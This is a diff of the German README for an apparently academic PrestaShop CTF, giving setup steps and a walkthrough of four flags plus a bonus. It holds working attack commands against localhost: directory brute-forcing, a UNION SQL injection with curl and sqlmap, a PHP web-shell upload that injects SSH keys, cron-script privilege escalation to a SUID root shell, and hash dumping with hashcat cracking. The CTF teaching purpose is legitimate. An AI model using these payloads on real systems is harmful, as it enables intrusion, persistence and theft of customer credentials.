@@ -1,34 +1,22 @@
 # Dieses Repo ist eine CTF Demo im Rahmen des Bachelorstudiums für das Fach Offensive Security
 
-Ziel des CTF ist es 4 Flags zu finden. Weiter unten ist eine Musterlösung zum finden dieser.
+Ziel des CTF ist es 4 Flags zu finden. Weiter unten befindet sich eine Musterlösung zum finden der Flags.
 
 Die Flags haben immer folgendes Format:
 
     FLAG{Name_der_Flag}
-# CTF Walkthrough
 
-Dieses Dokument fasst alle Schritte zusammen, um das PrestaShop-CTF aufzusetzen und die vier Flags zu extrahieren.
 
----
 
-## Inhaltsverzeichnis
 
-1. [Setup & Installation](#setup--installation)  
-2. [Flag 1: Backup-Leak](#flag-1-backup-leak)  
-3. [Flag 2: SQL-Injection im ndk_steppingpack](#flag-2-sql-injection-im-ndk_steppingpack)  
-4. [Flag 3: SSH-Key Injection via File-Upload](#flag-3-ssh-key-injection-via-file-upload)  
-5. [Flag 4: Privilege Escalation via Cron](#flag-4-privilege-escalation-via-cron)  
+# Setup & Installation
 
----
-
-## Setup & Installation
-
-1. **Repository klonen**  
+ **Repository klonen**  
    ```bash
    git clone https://github.com/DirkMe/CTF-Offsec ctf
    cd ctf
 
-Ordnerstruktur
+Ordnerstruktur:
  
     ctf/
     ├── docker-compose.yml
@@ -48,6 +36,10 @@ Container starten
     docker compose build --no-cache
     docker compose up -d
 
+in manchen Fällen startet der Container nicht weil die start.sh aus unbekannten Gründen nicht in den Container kopiert wird.
+Für diesen hab ich das fertige Dockerimage in einem Repository hochgeladen und wird von der docker-compose_v2.yml verwendet.
+
+
 Falls das Fehlschlägt:
 
     docker compose -f docker-compose_v2.yml build --no-cache
@@ -55,54 +47,73 @@ Falls das Fehlschlägt:
 
 Webshop: http://localhost:8080
 
+Im Falle einer Installation mit externer IP muss sich im Adminportal 
+http://\<IP-Adresse\>:8080/admin9625 angemeldet werden mit admin@example.com und Passwort: password
+
+Unter Preferences --> SEO & URLs runterscrollen und unter Set shop URL die IP-Adresse+Port eintragen. Dann sollte der Container auch über die IP verfügbar sein aber nicht über localhost, da diese Einstellung jeder PHP Link auf die eingestellte Adresse weiterleitet.
+
+# CTF Walkthrough
+
+---
+
+## Inhaltsverzeichnis
+
+1. [Flag 1: Backup-Leak](#flag-1-backup-leak)  
+2. [Flag 2: SQL-Injection im ndk_steppingpack](#flag-2-sql-injection-im-ndk_steppingpack)  
+3. [Flag 3: SSH-Key Injection via File-Upload](#flag-3-ssh-key-injection-via-file-upload)  
+4. [Flag 4: Privilege Escalation via Cron](#flag-4-privilege-escalation-via-cron)  
+
+---
+
 ## Flag 1: Backup-Leak
 Vulnerable Path:
-modules/blocklayered/data/backups/flag1.txt
+backup/flag1.txt
+
+z.B. Findbar durch 
+
+    feroxbuser -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt -x .txt
 
 Exploit:
 
-    curl http://localhost:8080/modules/blocklayered/data/backups/flag1.txt
+    curl http://localhost:8080/backup/flag1.txt
+
+
  
-⇒ FLAG{BACKUP_LEAK}
+⇒ FLAG{Backup Leak}  Es gibt einen User auf dem Server mit dem Nutzernamen CTF
 
 
 ## Flag 2: SQL-Injection im ndk_steppingpack
-
-Zu finden im Header rechts oben als button mit dem Namen "Current Order"
 Modul:
 modules/ndk_steppingpack/
 – Front-Controller quote mit ungefiltertem product_id
 
-Database-Init (flag_init.sh):
-
-    CREATE TABLE IF NOT EXISTS prefix2_0ctf_flags (
-    id INT AUTO_INCREMENT PRIMARY KEY,
-    flag VARCHAR(255)
-    );
-    INSERT IGNORE INTO prefix2_0ctf_flags(flag)
-    VALUES('FLAG{SQLI_SUCCESS}');
-Exploit-Steps:
+Zu finden im Header rechts oben als button mit dem Namen "Current Order" Gibt eine Json zurück und sieht mit dem URL Parameter nach möglichem SQL aus ==> **?product_id=1**
 
 Test SQL Injection
 
-curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=1"
-⇒ [{"product_id":"1","data":"CTF-Pack-Demo"}]
-Spalten-Probe (2 Spalten: product_id,data):
+    curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=1"
+    ⇒ [{"product_id":"1","data":"CTF-Pack-Demo"}]
+    Spalten-Probe (2 Spalten: product_id,data):
 
 
 nächster try ob UNION SELECT funktioniert
 
-curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=-1%20UNION%20SELECT%201,2%23"
-⇒ [{"product_id":"1","data":"2"}]
+    curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=-1%20UNION%20SELECT%201,2%23"
+    ⇒ [{"product_id":"1","data":"2"}]
 
 
 Flag-Dump:
 
-curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=-1%20UNION%20SELECT%201,flag%20FROM%20prefix2_0ctf_flags%23"
+    curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=-1%20UNION%20SELECT%201,flag%20FROM%20prefix2_0ctf_flags%23"
+
+
 ⇒ [{"product_id":"1","data":"FLAG{SQLI_SUCCESS}"}]
+
+⇒FLAG{SQLI_SUCCESS}
+
 (Optional mit sqlmap:)
 
-
+z.B. auch DB komplett auslesbar über SQLMap welche Tabellen existieren und dadurch Infos sammeln.
 
     sqlmap -u "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=1" \
        -p product_id --dbms mysql --batch --union-cols=2 \
@@ -111,32 +122,25 @@ curl -s "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&contr
 
 ## Flag 3: SSH-Key Injection via File-Upload
 
-Zu finden im Header rechts oben als button mit dem Namen "Upload File"
-
-
 Modul:
 modules/orderfiles/ajax/upload.php
 – unauth. Upload von exampleshell.php
 
-exampleshell.php (upload target):
+Zu finden im Header rechts oben als button mit dem Namen "Upload File"
+Beim klicken kommt folgende Nachricht:
+
+Oops Something Went Wrong. Try again with curl and the orderfile
 
 
-
-
-    <?php
-    if (isset($_POST['key'])) {
-        file_put_contents(
-            '/home/ctf/.ssh/authorized_keys',
-            trim($_POST['key']) . "\\n",
-            FILE_APPEND|LOCK_EX
-        );
-        echo "Key injected";
-    }
 Exploit-Steps:
 
 Shell hochladen 
 
     curl -F "file=@exampleshell.php;filename=exampleshell.php"      -F "auptype=product"      http://localhost:8080/modules/orderfiles/ajax/upload.php
+
+gibt dann auch den Ablegeort zurück um dann auf diese zugreifen zu können
+
+    {"ok":true,"path":"modules\/orderfiles\/data\/uploads\/exampleshell.php"}
 
 Public-Key injizieren:
 
@@ -147,23 +151,19 @@ SSH-Login (Key-Only):
     ssh -i ~/.ssh/id_ed25519 -p 2222 ctf@localhost
 Flag auslesen:
 
-    cat ~/.ssh/flag3.txt   # ⇒ FLAG{SSH_PERSISTENCE}
+    cat ~/.ssh/flag3.txt   
+    
+ ⇒ FLAG{SSH_PERSISTENCE}
 
 ## Flag 4: Privilege Escalation via Cron
 Mechanismus:
-cron-backup.sh läuft jede Minute als root, kopiert Bash nach /tmp/rootbash und setzt SUID.
-
-cron-backup.sh:
-
-#!/bin/bash
-cp /bin/bash /tmp/rootbash
-chmod +s /tmp/rootbash
-tar czf /tmp/backup_$(date +%s).tgz /var/www/html
+cron-backup.sh läuft jede Minute als root aber der Nutzer CTF hat Lese und Schreibzugriff darauf
 
 
 Exploit-Steps:
 
 Als ctf /usr/local/bin/cron-backup.sh überschreiben:
+
 
     cat > /usr/local/bin/cron-backup.sh <<'EOF'
     #!/bin/bash
@@ -171,6 +171,7 @@ Als ctf /usr/local/bin/cron-backup.sh überschreiben:
     chmod +s /tmp/rootbash
     EOF
     chmod +x /usr/local/bin/cron-backup.sh
+
 Warten (≤ 1 Minute) bis Cron läuft
 
 Root-Shell nutzen:
@@ -180,13 +181,13 @@ Root-Shell nutzen:
 
 ⇒ FLAG{CRON_ROOT}
 
-Zusammenfassung
+## Zusammenfassung
 
 Flag	Vector	Abruf-Kommando
 
-#1	Backup-Leak in blocklayered	
+#1	Backup-Leak in Backup Ordner	
 
-    curl http://localhost:8080/modules/blocklayered/data/backups/flag1.txt
+    curl http://localhost:8080/backup/flag1.txt
 
 #2	SQLi im ndk_steppingpack	siehe UNION-Exploit oben
 
@@ -203,11 +204,11 @@ Flag	Vector	Abruf-Kommando
 # BONUS
 ## Knacken von Mitarbeiter und Kunden Accounts
 
-PrestaShop 1.5 speichert das Passwort als
+PrestaShop 1.5 speichert das Passwort in der Datenbank als folgenden Hash:
 
     MD5( _COOKIE_KEY_ + KlartextPasswort )
 
-Dabei kann man die Kunden oder Mitarbeitertabelle dumpen:
+Dabei kann man durch die SQL Injection mit SQLMap die Kunden oder Mitarbeitertabelle dumpen:
 
     sqlmap \
     -u "http://localhost:8080/index.php?fc=module&module=ndk_steppingpack&controller=quote&product_id=1" \
@@ -246,7 +247,7 @@ z.B.
 
     8435a9aa1b345cbfdde930ae2153b873:oKgrQhBqLgjkUfx8d2vvCXNxKZCGF1XeKMa5wBub46S7tJH9jpDFe4Cn
 
-diesen kann man dann in Kalilinux z.B. mit Hashcat bruteforcen
+diesen kann man dann in Kali linux z.B. mit Hashcat bruteforcen
 
     hashcat -m 20 salted_hash.txt /usr/share/wordlists/rockyou.txt
 
